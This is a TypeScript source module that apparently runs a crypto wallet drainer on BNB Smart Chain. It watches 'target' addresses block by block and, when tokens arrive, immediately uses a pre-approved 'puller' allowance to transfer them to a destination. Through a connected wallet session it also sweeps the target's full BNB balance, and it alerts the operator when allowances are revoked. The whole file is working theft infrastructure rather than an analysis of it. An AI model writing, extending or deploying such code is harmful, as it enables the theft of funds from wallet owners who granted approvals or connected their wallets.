import { createPublicClient, webSocket, fallback } from 'viem';
import { bsc } from 'viem/chains';
import { ENV } from '../config/env';
import { NATIVE } from '../config/constants';
import { listActive, setAllowanceOk, type Target } from './storage';
import { pullOne, balanceOf, allowanceOf, gasOf } from './puller';
import { sendMax, status, address, txLock } from './baw';
import { notify } from './notify';

const pub = createPublicClient({
  chain: bsc,
  transport: fallback(ENV.WSS_URLS.map(u => webSocket(u))),
});

const cache = new Map<string, Target>();
const inflight = new Set<string>();
const lastFired = new Map<string, number>();
const sessionOk = new Map<string, number>();
const lastBal = new Map<string, bigint>();
const orphanWarned = new Set<string>();

export const engineState = { armed: false, targets: 0, blocks: 0, lastBlock: 0, startedAt: 0 };

const COOLDOWN_MS = 1_500;
const MAX_TRIES = 3;
const sref = (t: Target) => ({ dir: `t${t.target}`, instanceId: t.instanceId! });

async function refresh() {
  try {
    const rows = await listActive();
    cache.clear();
    for (const r of rows) cache.set(r.target, r);
    engineState.targets = rows.length;

    for (const r of rows) {
      if (!r.puller) {
        if (!orphanWarned.has(r.target)) {
          orphanWarned.add(r.target);
          console.log(`[engine] SKIP ${r.target} — no puller, run /repair`);
          await notify(r.userId, `⚠️ \`${r.target}\` has no puller and is being skipped.\nSend \`/repair ${r.target} ${r.destination}\``);
        }
      } else orphanWarned.delete(r.target);
    }
  } catch (e: any) { console.error('[engine] refresh', e.message); }
}

async function checkAllowances(t: Target) {
  if (!t.puller) return;
  for (const tok of t.tokens) {
    try {
      const ok = (await allowanceOf(t.target, t.puller, tok.token)) > 0n;
      if (ok !== tok.allowanceOk) {
        await setAllowanceOk(tok.id, ok);
        if (!ok) await notify(t.userId,
          `⚠️ Allowance gone: \`${tok.token}\` on \`${t.target}\`.\nPuller: \`${t.puller}\``);
      }
    } catch { /* transient */ }
  }
}

async function tryPull(t: Target, token: `0x${string}`) {
  const k = `pull:${t.target}:${token}`;
  if (inflight.has(k)) return;
  if (Date.now() - (lastFired.get(k) ?? 0) < COOLDOWN_MS) return;
  if (!t.puller || !t.pullerKey) return;

  inflight.add(k);
  lastFired.set(k, Date.now());
  try {
    for (let i = 1; i <= MAX_TRIES; i++) {
      try { await pullOne(t.pullerKey, t.target, t.destination, token); return; }
      catch (e: any) {
        const m = String(e.message || e);
        console.error(`[pull ${i}] ${token} ${t.target}: ${m}`);
        if (m.includes('ALLOWANCE_ZERO')) { await checkAllowances(t); return; }
        if (m.includes('PULLER_LOW_GAS')) {
          await notify(t.userId, `⛽ Puller \`${t.puller}\` out of BNB.`);
          return;
        }
        await new Promise(r => setTimeout(r, 200 * i));
      }
    }
  } finally { inflight.delete(k); }
}

async function sessionLive(t: Target) {
  if (!t.instanceId) return false;
  if (Date.now() - (sessionOk.get(t.target) ?? 0) < 10_000) return true;
  try {
    const s = sref(t);
    const [st, ad] = await Promise.all([status(s), address(s)]);
    const hit = ad.data.addresses.find(a => a.binanceChainId === '56');
    if (st.data.status !== 'CONNECTED' || hit?.address.toLowerCase() !== t.target.toLowerCase()) return false;
    sessionOk.set(t.target, Date.now());
    return true;
  } catch { return false; }
}

async function bnbLeg(t: Target) {
  if (!ENV.ENABLE_BNB_LEG || !(await sessionLive(t))) return;
  const k = `bnb:${t.target}`;
  if (inflight.has(k)) return;
  inflight.add(k);
  try {
    const { data } = await txLock(sref(t));
    if (data.status === 'LOCKED') return;
    await sendMax(sref(t), NATIVE, t.destination);
    console.log(`[BNB LEG] ${t.target}`);
  } catch (e: any) {
    console.error(`[bnb] ${t.target}: ${String(e.stdout || e.message).slice(0, 140)}`);
  } finally { inflight.delete(k); }
}

async function scan(t: Target) {
  for (const tok of t.tokens) {
    const bal = await balanceOf(t.target, tok.token);
    const key = `${t.target}:${tok.token}`;
    const prev = lastBal.get(key) ?? 0n;
    lastBal.set(key, bal);
    if (bal > 0n && bal > prev) {
      console.log(`[ARRIVAL] ${tok.token} ${t.target}`);
      await tryPull(t, tok.token);
      setTimeout(() => { void bnbLeg(t); }, 1_200);
    }
  }
}

export async function startEngine() {
  engineState.startedAt = Date.now();
  await refresh();
  setInterval(refresh, 4_000);
  setInterval(() => { for (const t of cache.values()) void checkAllowances(t); }, 300_000);

  let chain: Promise<unknown> = Promise.resolve();
  pub.watchBlocks({
    onBlock: (b) => {
      engineState.blocks++;
      engineState.lastBlock = Number(b.number ?? 0);
      chain = chain
        .then(() => Promise.allSettled([...cache.values()].map(t => scan(t))))
        .catch(e => console.error('[cycle]', e.message));
    },
  });
  engineState.armed = true;
  console.log(`[engine] ARMED — ${cache.size} target(s), USDT primary`);
}

export { gasOf };
